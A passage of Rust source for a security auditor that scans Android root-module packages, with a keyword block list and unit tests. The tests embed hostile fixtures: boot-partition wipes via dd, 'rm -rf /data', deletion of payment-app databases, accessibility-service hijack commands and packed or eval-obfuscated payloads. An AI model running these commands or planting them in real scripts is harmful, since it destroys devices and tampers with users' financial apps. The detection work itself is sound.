        "chown",
        "pm clear",
        "pm uninstall",
        "sed -i",
        " update ",
        " insert ",
        " delete ",
        " replace ",
        "--patch",
        "--inject",
        "--hook",
        "--delete",
        "--remove",
    ]
    .iter()
    .any(|marker| lower.contains(marker))
}

fn is_sensitive_financial_data_path(value: &str) -> bool {
    let lower = value.to_ascii_lowercase();
    lower.contains("/data/")
        || lower.contains("/data_mirror/")
        || lower.contains("/storage/emulated/")
}

fn extract_binary_strings(bytes: &[u8]) -> Vec<String> {
    const MIN_LENGTH: usize = 4;
    const MAX_STRING_LENGTH: usize = 4096;
    const MAX_STRINGS: usize = 65_536;
    let mut output = Vec::new();
    let mut current = Vec::new();
    for &byte in bytes {
        if byte.is_ascii_graphic() || byte == b' ' {
            current.push(byte);
            if current.len() >= MAX_STRING_LENGTH {
                push_binary_string(&mut output, &mut current, MIN_LENGTH, MAX_STRINGS);
            }
        } else {
            push_binary_string(&mut output, &mut current, MIN_LENGTH, MAX_STRINGS);
        }
        if output.len() >= MAX_STRINGS {
            return output;
        }
    }
    push_binary_string(&mut output, &mut current, MIN_LENGTH, MAX_STRINGS);

    for offset in 0..=1 {
        let mut utf16 = Vec::new();
        for pair in bytes[offset..].chunks_exact(2) {
            if pair[1] == 0 && (pair[0].is_ascii_graphic() || pair[0] == b' ') {
                utf16.push(pair[0]);
                if utf16.len() >= MAX_STRING_LENGTH {
                    push_binary_string(&mut output, &mut utf16, MIN_LENGTH, MAX_STRINGS);
                }
            } else {
                push_binary_string(&mut output, &mut utf16, MIN_LENGTH, MAX_STRINGS);
            }
            if output.len() >= MAX_STRINGS {
                break;
            }
        }
        push_binary_string(&mut output, &mut utf16, MIN_LENGTH, MAX_STRINGS);
    }
    output
}

fn push_binary_string(
    output: &mut Vec<String>,
    current: &mut Vec<u8>,
    min_length: usize,
    max_strings: usize,
) {
    if current.len() >= min_length
        && output.len() < max_strings
        && let Ok(value) = String::from_utf8(std::mem::take(current))
    {
        output.push(value);
    } else {
        current.clear();
    }
}

fn abbreviated_evidence(value: &str) -> String {
    const LIMIT: usize = 160;
    let clean: String = value
        .chars()
        .map(|character| {
            if character.is_control() {
                ' '
            } else {
                character
            }
        })
        .collect();
    if clean.chars().count() <= LIMIT {
        clean
    } else {
        format!("{}...", clean.chars().take(LIMIT).collect::<String>())
    }
}

fn profile_binary(path: &str, bytes: &[u8]) -> BinaryProfile {
    BinaryProfile {
        path: path.to_owned(),
        basename: posix_basename(path).to_owned(),
        base64_like: contains_any_bytes(bytes, &[b"base64", b"--decode", b"BIO_f_base64"]),
        openssl_like: contains_any_bytes(bytes, &[b"OpenSSL", b"libcrypto", b"EVP_"]),
    }
}

fn contains_any_bytes(bytes: &[u8], indicators: &[&[u8]]) -> bool {
    indicators.iter().any(|indicator| {
        bytes
            .windows(indicator.len())
            .any(|window| window == *indicator)
    })
}

fn logical_lines(text: &str) -> Vec<String> {
    let mut output = Vec::new();
    let mut current = String::new();
    for line in physical_lines(text) {
        if line.ends_with('\\') {
            current.push_str(line.trim_end_matches('\\'));
            current.push(' ');
        } else {
            current.push_str(&line);
            output.push(std::mem::take(&mut current));
        }
    }
    if !current.is_empty() {
        output.push(current);
    }
    output
}

fn physical_lines(text: &str) -> Vec<String> {
    let mut output = Vec::new();
    let mut current = String::new();
    let mut chars = text.chars().peekable();
    while let Some(character) = chars.next() {
        if matches!(character, '\n' | '\r') {
            if character == '\r' && chars.peek() == Some(&'\n') {
                chars.next();
            }
            output.push(std::mem::take(&mut current));
        } else {
            current.push(character);
        }
    }
    if !current.is_empty() || output.is_empty() {
        output.push(current);
    }
    output
}

fn shell_tokens(line: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let mut current = String::new();
    let mut chars = line.chars().peekable();
    let mut quote = None;
    while let Some(character) = chars.next() {
        if let Some(delimiter) = quote {
            if character == delimiter {
                quote = None;
            } else if character == '\\' && delimiter == '"' {
                if let Some(next) = chars.next() {
                    current.push(next);
                }
            } else {
                current.push(character);
            }
            continue;
        }
        match character {
            '\'' | '"' => quote = Some(character),
            '#' if current.is_empty() => break,
            '\\' => {
                if let Some(next) = chars.next() {
                    current.push(next);
                }
            }
            ' ' | '\t' | '\r' => push_token(&mut tokens, &mut current),
            ';' | '|' | '&' => {
                push_token(&mut tokens, &mut current);
                let mut operator = character.to_string();
                if chars.peek() == Some(&character) {
                    operator.push(chars.next().unwrap_or(character));
                }
                tokens.push(operator);
            }
            '>' | '<' => {
                push_token(&mut tokens, &mut current);
                let mut operator = character.to_string();
                if chars.peek() == Some(&character) {
                    operator.push(chars.next().unwrap_or(character));
                }
                tokens.push(operator);
            }
            '(' | ')' => {
                push_token(&mut tokens, &mut current);
                tokens.push(character.to_string());
            }
            _ => current.push(character),
        }
    }
    push_token(&mut tokens, &mut current);
    tokens
}

fn push_token(tokens: &mut Vec<String>, current: &mut String) {
    if !current.is_empty() {
        tokens.push(std::mem::take(current));
    }
}

fn split_commands(tokens: &[String]) -> Vec<&[String]> {
    let mut commands = Vec::new();
    let mut start = 0;
    for (index, token) in tokens.iter().enumerate() {
        if matches!(token.as_str(), ";" | "|" | "&&" | "||" | "&" | "(" | ")") {
            if start < index {
                commands.push(&tokens[start..index]);
            }
            start = index + 1;
        }
    }
    if start < tokens.len() {
        commands.push(&tokens[start..]);
    }
    commands
}

fn split_pipeline_groups(tokens: &[String]) -> Vec<Vec<&[String]>> {
    let mut groups = Vec::new();
    let mut group = Vec::new();
    let mut start = 0;
    for (index, token) in tokens.iter().enumerate() {
        match token.as_str() {
            "|" => {
                if start < index {
                    group.push(&tokens[start..index]);
                }
                start = index + 1;
            }
            ";" | "&&" | "||" | "&" | "(" | ")" => {
                if start < index {
                    group.push(&tokens[start..index]);
                }
                if !group.is_empty() {
                    groups.push(std::mem::take(&mut group));
                }
                start = index + 1;
            }
            _ => {}
        }
    }
    if start < tokens.len() {
        group.push(&tokens[start..]);
    }
    if !group.is_empty() {
        groups.push(group);
    }
    groups
}

fn operands_before_redirection(args: &[String]) -> Vec<&String> {
    let end = args
        .iter()
        .position(|arg| matches!(arg.as_str(), ">" | ">>" | "<" | "<<"))
        .unwrap_or(args.len());
    args[..end].iter().collect()
}

fn normalize_command(command: &[String]) -> (String, Vec<String>) {
    normalize_command_depth(command, 0)
}

fn normalize_command_depth(command: &[String], depth: usize) -> (String, Vec<String>) {
    let mut index = command
        .iter()
        .position(|token| !is_assignment(token))
        .unwrap_or(command.len());
    while index < command.len()
        && matches!(
            command[index].as_str(),
            "command" | "env" | "exec" | "if" | "then" | "do" | "!" | "time"
        )
    {
        index += 1;
        while index < command.len() && command[index].starts_with('-') {
            index += 1;
        }
    }
    if index >= command.len() {
        return (String::new(), Vec::new());
    }
    let mut name = posix_basename(&command[index]).to_owned();
    index += 1;
    if matches!(name.as_str(), "busybox" | "toybox") && index < command.len() {
        name.clone_from(&command[index]);
        index += 1;
    }
    if name == "su"
        && depth < 4
        && let Some(command_index) = command[index..]
            .iter()
            .position(|token| token == "-c" || token == "--command")
            .map(|offset| index + offset + 1)
        && command_index < command.len()
    {
        let nested = command[command_index..].join(" ");
        let nested_tokens = shell_tokens(&nested);
        return normalize_command_depth(&nested_tokens, depth + 1);
    }
    (name, command[index..].to_vec())
}

fn collect_assignments(tokens: &[String], variables: &mut BTreeMap<String, String>) {
    for token in tokens {
        if matches!(token.as_str(), ";" | "|" | "&&" | "||") {
            continue;
        }
        let Some((name, value)) = token.split_once('=') else {
            continue;
        };
        if is_variable_name(name) {
            if name == "MODDIR" && (value.contains("$0") || value.contains("${0")) {
                continue;
            }
            variables.insert(name.to_owned(), expand_variables(value, variables));
        }
    }
}

fn is_assignment(token: &str) -> bool {
    token
        .split_once('=')
        .is_some_and(|(name, _)| is_variable_name(name))
}

fn is_variable_name(name: &str) -> bool {
    !name.is_empty()
        && name.chars().enumerate().all(|(index, character)| {
            character == '_'
                || character.is_ascii_alphanumeric()
                    && (index > 0 || character.is_ascii_alphabetic())
        })
}

fn predefined_variables(module_id: Option<&str>) -> BTreeMap<String, String> {
    let id = module_id.unwrap_or("$MODID");
    let module_path = format!("/data/adb/modules_update/{id}");
    BTreeMap::from([
        ("MODID".to_owned(), id.to_owned()),
        ("MODPATH".to_owned(), module_path.clone()),
        ("MODDIR".to_owned(), module_path),
        ("TMPDIR".to_owned(), "/data/adb/ksu/.audit-tmp".to_owned()),
    ])
}

fn expand_variables(value: &str, variables: &BTreeMap<String, String>) -> String {
    let mut output = String::new();
    let chars: Vec<_> = value.chars().collect();
    let mut index = 0;
    while index < chars.len() {
        if chars[index] != '$' {
            output.push(chars[index]);
            index += 1;
            continue;
        }
        if index + 1 < chars.len() && chars[index + 1] == '{' {
            let mut end = index + 2;
            while end < chars.len() && chars[end] != '}' {
                end += 1;
            }
            if end < chars.len() {
                let name: String = chars[index + 2..end].iter().collect();
                if let Some(expanded) = variables.get(&name) {
                    output.push_str(expanded);
                } else {
                    output.push_str(&format!("${{{name}}}"));
                }
                index = end + 1;
                continue;
            }
        }
        let mut end = index + 1;
        while end < chars.len() && (chars[end] == '_' || chars[end].is_ascii_alphanumeric()) {
            end += 1;
        }
        if end == index + 1 {
            output.push('$');
            index += 1;
            continue;
        }
        let name: String = chars[index + 1..end].iter().collect();
        if let Some(expanded) = variables.get(&name) {
            output.push_str(expanded);
        } else {
            output.push('$');
            output.push_str(&name);
        }
        index = end;
    }
    output
}

fn resolve_path(value: &str, variables: &BTreeMap<String, String>, current_dir: &str) -> String {
    let expanded = expand_variables(value, variables);
    if expanded.is_empty() {
        return String::new();
    }
    if contains_unresolved_variable(&expanded) || expanded.contains("$(") || expanded.contains('`')
    {
        return expanded;
    }
    // Module scripts always use Android/POSIX paths. Host Path semantics would
    // treat `/system` as relative when the audit tests run on Windows.
    let joined = if expanded.starts_with('/') {
        expanded
    } else {
        format!("{}/{expanded}", current_dir.trim_end_matches('/'))
    };
    normalize_path(&joined)
}

fn normalize_path(path: &str) -> String {
    let mut components: Vec<String> = Vec::new();
    for component in path.split('/') {
        match component {
            "" | "." => {}
            ".." => {
                components.pop();
            }
            value => components.push(value.to_owned()),
        }
    }
    format!("/{}", components.join("/"))
}

fn posix_basename(path: &str) -> &str {
    path.trim_end_matches('/')
        .rsplit('/')
        .next()
        .unwrap_or(path)
}

fn is_module_owned(path: &str, module_id: Option<&str>) -> bool {
    path.starts_with("/data/adb/ksu/.audit-tmp/")
        || path == "/data/adb/ksu/.audit-tmp"
        || module_id.is_some_and(|id| {
            let active = format!("/data/adb/modules/{id}");
            let updated = format!("/data/adb/modules_update/{id}");
            path == active
                || path.starts_with(&format!("{active}/"))
                || path == updated
                || path.starts_with(&format!("{updated}/"))
        })
}

fn is_broad_delete(path: &str) -> bool {
    matches!(
        path.trim_end_matches('/'),
        "" | "/"
            | "/data"
            | "/data/adb"
            | "/data/adb/modules"
            | "/data/adb/modules_update"
            | "/system"
            | "/vendor"
            | "/product"
            | "/odm"
            | "/system_ext"
    ) || path.ends_with("/*")
}

fn is_block_device_path(path: &str) -> bool {
    path.starts_with("/dev/block/")
        || path.starts_with("/dev/mapper/")
        || path.starts_with("/dev/bootdevice/")
        || path.starts_with("/dev/mmcblk")
        || path.starts_with("/dev/mtd")
        || path
            .strip_prefix("/dev/sd")
            .is_some_and(|tail| !tail.is_empty())
}

fn is_destructive_writer(name: &str) -> bool {
    name == "blkdiscard"
        || name == "wipefs"
        || name == "flash_erase"
        || name == "nandwrite"
        || name == "mtd"
        || name == "truncate"
        || name == "fallocate"
        || name == "cp"
        || name == "mv"
        || name == "tee"
        || name.starts_with("mkfs")
}

fn is_flash_writer(name: &str) -> bool {
    matches!(
        name,
        "blkdiscard"
            | "wipefs"
            | "flash_erase"
            | "flash_image"
            | "nandwrite"
            | "write_raw_image"
            | "mtd"
            | "fastboot"
    ) || name.starts_with("mkfs")
}

fn contains_unresolved_variable(value: &str) -> bool {
    value.contains('$')
}

fn is_safe_zip_path(path: &str) -> bool {
    !path.is_empty()
        && !path.starts_with('/')
        && !path.starts_with('\\')
        && !path.split('/').any(|component| component == "..")
}

fn parse_module_id(bytes: &[u8]) -> Option<String> {
    String::from_utf8_lossy(bytes).lines().find_map(|line| {
        let (key, value) = line.split_once('=')?;
        (key.trim() == "id").then(|| value.trim().to_owned())
    })
}

fn sha256_bytes(bytes: &[u8]) -> String {
    hex_digest(Sha256::digest(bytes).as_slice())
}

fn hex_digest(bytes: &[u8]) -> String {
    const HEX: &[u8; 16] = b"0123456789abcdef";
    let mut output = String::with_capacity(bytes.len() * 2);
    for byte in bytes {
        output.push(char::from(HEX[usize::from(byte >> 4)]));
        output.push(char::from(HEX[usize::from(byte & 0x0f)]));
    }
    output
}

#[cfg(test)]
mod tests {
    use super::*;
    use flate2::{Compression, write::GzEncoder};
    use std::io::{Cursor, Write};
    use zip::write::SimpleFileOptions;

    fn rules(report: &AuditReport) -> Vec<&str> {
        report
            .findings
            .iter()
            .map(|finding| finding.rule_id.as_str())
            .collect()
    }

    fn gzip(bytes: &[u8]) -> Vec<u8> {
        let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
        encoder.write_all(bytes).unwrap();
        encoder.finish().unwrap()
    }

    fn gzexe(payload: &[u8]) -> Vec<u8> {
        let stub =
            b"#!/system/bin/sh\nskip=5\ntail -n +$skip <\"$0\" | gzip -cd > /tmp/x\n/tmp/x\n";
        let mut output = stub.to_vec();
        output.extend(gzip(payload));
        output
    }

    fn module_zip(entries: &[(&str, &[u8])]) -> Vec<u8> {
        let cursor = Cursor::new(Vec::new());
        let mut writer = zip::ZipWriter::new(cursor);
        for (path, bytes) in entries {
            writer
                .start_file(*path, SimpleFileOptions::default())
                .unwrap();
            writer.write_all(bytes).unwrap();
        }
        writer.finish().unwrap().into_inner()
    }

    fn elf_with_markers(markers: &[u8]) -> Vec<u8> {
        let mut elf = vec![0_u8; 64];
        elf[..6].copy_from_slice(b"\x7fELF\x02\x01");
        elf[16..18].copy_from_slice(&2_u16.to_le_bytes());
        elf.extend_from_slice(markers);
        elf
    }

    fn utf16le_markers(markers: &[&str]) -> Vec<u8> {
        let mut output = Vec::new();
        for marker in markers {
            output.extend_from_slice(&[0, 0]);
            for byte in marker.bytes() {
                output.extend_from_slice(&[byte, 0]);
            }
            output.extend_from_slice(&[0, 0]);
        }
        output
    }

    #[test]
    fn detects_partition_writes_and_broad_delete() {
        let script = b"#!/system/bin/sh\nBLOCK=/dev/block/by-name/boot\nbusybox dd if=boot.img of=$BLOCK\nrm -rf /data\n";
        let report = scan_file_bytes("customize.sh", script, &AuditConfig::default());
        assert!(rules(&report).contains(&RULE_PARTITION_WRITE));
        assert!(rules(&report).contains(&RULE_BROAD_DELETE));
        assert!(report.has_critical());
        assert_eq!(report.required_confirmation_presses(), 2);
    }

    #[test]
    fn detects_financial_application_script_modifications() {
        let script = br#"#!/system/bin/sh
ALIPAY=com.eg.android.alipaygphone
rm -rf /data/user/0/$ALIPAY/databases
sqlite3 /data/user/0/com.tencent.mm/MicroMsg.db "UPDATE account SET token=''"
sed -i 's/enabled/disabled/' /data/user/0/com.example.mobilebanking/config.xml
pm clear in.org.npci.upiapp
"#;
        let report = scan_file_bytes("customize.sh", script, &AuditConfig::default());
        let findings: Vec<_> = report
            .findings
            .iter()
            .filter(|finding| finding.rule_id == RULE_FINANCIAL_SCRIPT_MODIFICATION)
            .collect();
        assert_eq!(findings.len(), 4);
        assert!(
            findings
                .iter()
                .all(|finding| finding.severity == Severity::Critical)
        );
    }

    #[test]
    fn detects_financial_modification_by_renamed_bundled_binary() {
        let tool = elf_with_markers(b"private utility");
        let zip = module_zip(&[
            ("module.prop", b"id=finance_patch\n"),
            (
                "customize.sh",
                b"#!/system/bin/sh\n$MODPATH/bin/helper --patch com.phonepe.app\n",
            ),
            ("bin/helper", &tool),
        ]);
        let report = scan_zip_bytes(&zip, &AuditConfig::default()).unwrap();
        assert!(rules(&report).contains(&RULE_FINANCIAL_SCRIPT_MODIFICATION));
    }

    #[test]
    fn detects_financial_modification_in_binary_strings() {
        let binary = elf_with_markers(
            b"/data/user/0/com.eg.android.alipaygphone/databases/account.db\0unlink\0",
        );
        let report = scan_file_bytes("bin/helper", &binary, &AuditConfig::default());
        let finding = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_FINANCIAL_BINARY_MODIFICATION)
            .unwrap();
        assert_eq!(finding.severity, Severity::High);

        let binary = elf_with_markers(
            b"--inject /data/user/0/com.eg.android.alipaygphone/databases/account.db\0",
        );
        let report = scan_file_bytes("bin/helper", &binary, &AuditConfig::default());
        let finding = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_FINANCIAL_BINARY_MODIFICATION)
            .unwrap();
        assert_eq!(finding.severity, Severity::Critical);
    }

    #[test]
    fn detects_utf16_financial_modification_in_binary_strings() {
        let mut markers = Vec::new();
        for byte in b"com.tencent.mm --inject" {
            markers.extend_from_slice(&[*byte, 0]);
        }
        let binary = elf_with_markers(&markers);
        let report = scan_file_bytes("lib/arm64/libhelper.so", &binary, &AuditConfig::default());
        assert!(rules(&report).contains(&RULE_FINANCIAL_BINARY_MODIFICATION));
    }

    #[test]
    fn recursively_detects_packed_financial_modification() {
        let packed = gzip(
            b"#!/system/bin/sh\nrm -rf /data/user/0/com.google.android.apps.nbu.paisa.user/files\n",
        );
        let report = scan_file_bytes("payload.gz", &packed, &AuditConfig::default());
        let finding = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_FINANCIAL_SCRIPT_MODIFICATION)
            .unwrap();
        assert!(!finding.provenance.is_empty());
    }

    #[test]
    fn ignores_financial_mentions_without_modification() {
        let script = br#"#!/system/bin/sh
echo "Supports Alipay, WeChat, and UPI"
pm path com.eg.android.alipaygphone
dumpsys package com.tencent.mm
cp /data/user/0/com.phonepe.app/cache/export $MODPATH/backup
curl https://alipay.example/documentation
"#;
        let report = scan_file_bytes("service.sh", script, &AuditConfig::default());
        assert!(!rules(&report).contains(&RULE_FINANCIAL_SCRIPT_MODIFICATION));
        assert!(rules(&report).contains(&RULE_NETWORK));

        let binary = elf_with_markers(b"com.tencent.mm\0read-only package lookup\0unlink\0");
        let report = scan_file_bytes("bin/query", &binary, &AuditConfig::default());
        assert!(!rules(&report).contains(&RULE_FINANCIAL_BINARY_MODIFICATION));
    }

    #[test]
    fn recursively_audits_apk_accessibility_financial_payloads() {
        let manifest = utf16le_markers(&[
            "android.permission.BIND_ACCESSIBILITY_SERVICE",
            "android.accessibilityservice.AccessibilityService",
        ]);
        let dex = b"dex\n035\0com.eg.android.alipaygphone\0Landroid/accessibilityservice/AccessibilityService;\0Landroid/view/accessibility/AccessibilityNodeInfo;\0performAction\0";
        let native =
            elf_with_markers(b"--inject /data/user/0/com.tencent.mm/databases/EnMicroMsg.db\0");
        let apk = module_zip(&[
            ("AndroidManifest.xml", &manifest),
            ("classes.dex", dex),
            ("lib/arm64-v8a/libpayload.so", &native),
        ]);
        let module = module_zip(&[("module.prop", b"id=embedded_apk\n"), ("payload.bin", &apk)]);

        let report = scan_zip_bytes(&module, &AuditConfig::default()).unwrap();
        assert!(rules(&report).contains(&RULE_APK_PRESENT));
        assert!(rules(&report).contains(&RULE_APK_ACCESSIBILITY_SERVICE));
        assert!(report.findings.iter().any(|finding| {
            finding.rule_id == RULE_FINANCIAL_ACCESSIBILITY_PAYLOAD
                && finding.severity == Severity::High
        }));
        assert!(report.findings.iter().any(|finding| {
            finding.rule_id == RULE_FINANCIAL_BINARY_MODIFICATION
                && finding.path == "payload.bin!/lib/arm64-v8a/libpayload.so"
                && !finding.provenance.is_empty()
        }));
        assert!(report.has_critical());
    }

    #[test]
    fn detects_root_accessibility_hijack_install_chain() {
        let script = br#"#!/system/bin/sh
PAYLOAD=$MODPATH/payload.apk
TARGET=com.example.payload
pm install -r "$PAYLOAD"
pm grant "$TARGET" android.permission.WRITE_SECURE_SETTINGS
settings --user 0 put secure enabled_accessibility_services "$TARGET/.ControlService"
cmd settings put secure accessibility_enabled 1
"#;
        let report = scan_file_bytes("customize.sh", script, &AuditConfig::default());
        assert!(report.findings.iter().any(|finding| {
            finding.rule_id == RULE_APK_INSTALL && finding.severity == Severity::High
        }));
        assert!(rules(&report).contains(&RULE_PRIVILEGED_PERMISSION_GRANT));
        assert_eq!(
            report
                .findings
                .iter()
                .filter(|finding| finding.rule_id == RULE_ACCESSIBILITY_HIJACK)
                .count(),
            2
        );
        assert!(report.findings.iter().any(|finding| {
            finding.rule_id == RULE_ACCESSIBILITY_HIJACK
                && finding.severity == Severity::Critical
                && finding.evidence.contains("enabled_accessibility_services")
        }));
        assert!(report.findings.iter().any(|finding| {
            finding.rule_id == RULE_ACCESSIBILITY_HIJACK
                && finding.severity == Severity::High
                && finding.evidence.contains("accessibility_enabled")
        }));
        assert!(report.has_critical());
    }

    #[test]
    fn detects_settings_provider_accessibility_hijack() {
        let script = b"#!/system/bin/sh\ncontent update --uri content://settings/secure --bind name:s:enabled_accessibility_services --bind value:s:evil/.Service\n";
        let report = scan_file_bytes("service.sh", script, &AuditConfig::default());
        assert!(rules(&report).contains(&RULE_ACCESSIBILITY_HIJACK));
    }

    #[test]
    fn pm_grant_does_not_claim_ungrantable_signature_permissions() {
        let script = b"#!/system/bin/sh\npm grant example.app android.permission.BIND_ACCESSIBILITY_SERVICE\npm grant example.app android.permission.MANAGE_DEVICE_ADMINS\npm grant example.app android.permission.GRANT_RUNTIME_PERMISSIONS\n";
        let report = scan_file_bytes("service.sh", script, &AuditConfig::default());
        assert!(!rules(&report).contains(&RULE_PRIVILEGED_PERMISSION_GRANT));
    }

    #[test]
    fn harmless_apk_and_accessibility_queries_are_not_critical() {
        let apk = module_zip(&[
            (
                "AndroidManifest.xml",
                b"manifest package=com.example.reader",
            ),
            (
                "classes.dex",
                b"dex\n035\0AccessibilityService\0performAction\0",
            ),
        ]);
        let module = module_zip(&[
            ("module.prop", b"id=harmless_apk\n"),
            (
                "customize.sh",
                b"#!/system/bin/sh\npm path com.example.reader\nsettings get secure enabled_accessibility_services\nsettings put secure accessibility_enabled 0\n",
            ),
            ("reader.apk", &apk),
        ]);
        let report = scan_zip_bytes(&module, &AuditConfig::default()).unwrap();
        assert!(rules(&report).contains(&RULE_APK_PRESENT));
        assert!(!rules(&report).contains(&RULE_FINANCIAL_ACCESSIBILITY_PAYLOAD));
        assert!(!rules(&report).contains(&RULE_ACCESSIBILITY_HIJACK));
        assert!(!report.has_critical());
    }

    #[test]
    fn apk_financial_accessibility_requires_service_and_package_target() {
        let dex = b"dex\n035\0com.eg.android.alipaygphone\0AccessibilityNodeInfo\0ACTION_CLICK\0";
        let apk = module_zip(&[
            (
                "AndroidManifest.xml",
                b"manifest package=com.example.regular",
            ),
            ("classes.dex", dex),
        ]);
        let report = scan_file_bytes("regular.apk", &apk, &AuditConfig::default());
        assert!(!rules(&report).contains(&RULE_FINANCIAL_ACCESSIBILITY_PAYLOAD));

        let permission_only_manifest =
            utf16le_markers(&["android.permission.BIND_ACCESSIBILITY_SERVICE"]);
        let apk = module_zip(&[
            ("AndroidManifest.xml", &permission_only_manifest),
            ("classes.dex", dex),
        ]);
        let report = scan_file_bytes("permission-only.apk", &apk, &AuditConfig::default());
        assert!(!rules(&report).contains(&RULE_APK_ACCESSIBILITY_SERVICE));
        assert!(!rules(&report).contains(&RULE_FINANCIAL_ACCESSIBILITY_PAYLOAD));

        let manifest = utf16le_markers(&[
            "android.permission.BIND_ACCESSIBILITY_SERVICE",
            "android.accessibilityservice.AccessibilityService",
        ]);
        let donation_dex = b"dex\n035\0Alipay donation\0AccessibilityNodeInfo\0ACTION_CLICK\0";
        let apk = module_zip(&[
            ("AndroidManifest.xml", &manifest),
            ("classes.dex", donation_dex),
        ]);
        let report = scan_file_bytes("donation.apk", &apk, &AuditConfig::default());
        assert!(!rules(&report).contains(&RULE_FINANCIAL_ACCESSIBILITY_PAYLOAD));
    }

    #[test]
    fn malformed_embedded_apk_fails_closed() {
        let report = scan_file_bytes(
            "payload.apk",
            b"not an Android application package",
            &AuditConfig::default(),
        );
        let finding = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_APK_UNINSPECTABLE)
            .unwrap();
        assert_eq!(finding.severity, Severity::High);
    }

    #[test]
    fn detects_native_zygisk_hook_targeting_financial_app() {
        let native =
            elf_with_markers(b"zygisk_module_entry\0com.eg.android.alipaygphone\0DobbyHook\0");
        let module = module_zip(&[
            ("module.prop", b"id=native_zygisk\n"),
            ("zygisk/arm64-v8a.so", &native),
        ]);
        let report = scan_zip_bytes(&module, &AuditConfig::default()).unwrap();
        assert!(rules(&report).contains(&RULE_ZYGISK_PAYLOAD));
        let finding = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_FINANCIAL_ZYGISK_INJECTION)
            .unwrap();
        assert_eq!(finding.severity, Severity::Critical);
        assert_eq!(finding.path, "zygisk/arm64-v8a.so");
    }

    #[test]
    fn detects_zygoteloader_dex_and_packages_financial_target() {
        let bridge = elf_with_markers(b"zygisk_module_entry\0InMemoryDexClassLoader\0");
        let dex = b"dex\n035\0Lcom/example/Entry;\0XposedBridge\0hookMethod\0";
        let module = module_zip(&[
            (
                "module.prop",
                b"id=java_zygisk\nentrypoint=com.example.Entry\nattachNativeLibs=false\n",
            ),
            ("classes.dex", dex),
            ("packages/com.tencent.mm", b""),
            ("zygisk/arm64-v8a.so", &bridge),
        ]);
        let report = scan_zip_bytes(&module, &AuditConfig::default()).unwrap();
        assert!(report.findings.iter().any(|finding| {
            finding.rule_id == RULE_ZYGISK_PAYLOAD && finding.path == "classes.dex"
        }));
        assert!(report.findings.iter().any(|finding| {
            finding.rule_id == RULE_FINANCIAL_ZYGISK_INJECTION
                && finding.path == "classes.dex"
                && finding.evidence.contains("com.tencent.mm")
        }));
    }

    #[test]
    fn benign_zygisk_capability_without_financial_target_is_not_critical() {
        let bridge = elf_with_markers(b"zygisk_module_entry\0InMemoryDexClassLoader\0");
        let dex = b"dex\n035\0AccessibilityHook\0XposedBridge\0hookMethod\0";
        let module = module_zip(&[
            (
                "module.prop",
                b"id=java_zygisk\nentrypoint=com.example.Entry\n",
            ),
            ("classes.dex", dex),
            ("packages/android", b""),
            ("zygisk/arm64-v8a.so", &bridge),
        ]);
        let report = scan_zip_bytes(&module, &AuditConfig::default()).unwrap();
        assert!(rules(&report).contains(&RULE_ZYGISK_PAYLOAD));
        assert!(!rules(&report).contains(&RULE_FINANCIAL_ZYGISK_INJECTION));
        assert!(!report.has_critical());
    }

    #[test]
    fn invalid_zygisk_library_is_reported_as_uninspectable() {
        let module = module_zip(&[
            ("module.prop", b"id=packed_zygisk\n"),
            ("zygisk/arm64-v8a.so", b"protected payload"),
        ]);
        let report = scan_zip_bytes(&module, &AuditConfig::default()).unwrap();
        let finding = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_ZYGISK_UNINSPECTABLE)
            .unwrap();
        assert_eq!(finding.severity, Severity::High);
    }

    #[test]
    fn module_owned_delete_is_info() {
        let script = b"#!/system/bin/sh\nrm -rf \"$MODPATH/cache\"\n";
        let mut state = ScanState::default();
        scan_artifact(
            Artifact {
                path: "customize.sh".to_owned(),
                bytes: script.to_vec(),
                provenance: Vec::new(),
                depth: 0,
                force_shell: false,
            },
            Some("example"),
            &AuditConfig::default(),
            &mut state,
        );
        assert_eq!(state.findings.len(), 1);
        assert_eq!(state.findings[0].rule_id, RULE_OWN_DELETE);
        assert_eq!(state.findings[0].severity, Severity::Info);
    }

    #[test]
    fn recursively_audits_gzexe_payloads() {
        let inner = b"#!/system/bin/sh\ncurl https://example.com/payload\nrm -rf /system\n";
        let packed = gzexe(&gzexe(inner));
        let report = scan_file_bytes("service.sh", &packed, &AuditConfig::default());
        assert_eq!(report.derived_artifacts, 2);
        assert!(rules(&report).contains(&RULE_PACKED_SHELL));
        let delete = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_BROAD_DELETE)
            .unwrap();
        assert_eq!(delete.provenance.len(), 2);
        assert!(rules(&report).contains(&RULE_NETWORK));
    }

    #[test]
    fn audits_hardcoded_tail_gzip_payload() {
        let inner = b"#!/system/bin/sh\ndd if=/dev/zero of=/dev/block/by-name/boot\n";
        let mut packed =
            b"#!/system/bin/sh\ntail -n +3 \"$0\" | gzip -cd > /data/payload\n".to_vec();
        packed.extend(gzip(inner));
        let report = scan_file_bytes("service.sh", &packed, &AuditConfig::default());
        assert!(rules(&report).contains(&RULE_PACKED_SHELL));
        assert!(rules(&report).contains(&RULE_PARTITION_WRITE));
    }

    #[test]
    fn audits_embedded_self_extracting_elf() {
        let mut packed =
            b"#!/system/bin/sh\nsed '1,/^PAYLOAD/d' \"$0\" > /data/tool\nPAYLOAD\n".to_vec();
        packed.extend(elf_with_markers(b"embedded payload"));
        let report = scan_file_bytes("installer.sh", &packed, &AuditConfig::default());
        assert!(rules(&report).contains(&RULE_PACKED_SHELL));
        assert!(rules(&report).contains(&RULE_BINARY_PRESENT));
    }

    #[test]
    fn audits_constant_variable_eval() {
        let script = b"#!/system/bin/sh\nA=\"d\";B=\"d\"\neval \"$A$B if=/dev/zero of=/dev/block/by-name/boot\"\n";
        let report = scan_file_bytes("customize.sh", script, &AuditConfig::default());
        let finding = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_PARTITION_WRITE)
            .unwrap();
        assert_eq!(finding.severity, Severity::Critical);
        assert!(!finding.provenance.is_empty());
    }

    #[test]
    fn audits_cross_file_self_indexed_payload() {
        let payload = "su -c dd if=/dev/zero of=/dev/block/by-name/boot";
        let mut host = "#!/sbin/sh\n".to_owned();
        let mut install = String::new();
        let mut expansion = String::new();
        for (index, character) in payload.chars().enumerate() {
            host.push('#');
            host.push(character);
